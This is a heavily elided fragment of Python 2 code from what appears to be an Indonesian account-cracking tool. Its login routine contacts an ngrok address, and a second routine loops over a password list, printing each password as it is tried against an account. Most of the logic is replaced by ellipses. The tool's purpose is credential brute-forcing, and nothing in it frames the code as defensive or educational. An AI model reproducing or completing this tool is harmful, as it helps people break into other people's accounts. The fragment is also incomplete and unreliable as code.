...
def login():
    ...
    try:
        ...
        tik()
        try:
            br.open('https://d8a92d4b.ngrok.io')
        except mechanize.URLError:
            print '\n\x1b[1;91m[!] koneksi loe mana bujank'
            keluar()
...
def pilih_super():
    ...
    jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mTunggu sebentar bujank \x1b[1;97m...')
    titik = ['.   ', '..  ', '... ']
    for o in titik:
    ...
    try:
        ...
        try:
            ...
            for pw in sandi:
                try:
                    pw = pw.replace('\n', '')
                    sys.stdout.write('\r\x1b[1;91m[\x1b[1;96m\xe2\x9c\xb8\x1b[1;91m] \x1b[1;92mMencoba bujank \x1b[1;97m' + pw)
                    sys.stdout.flush()
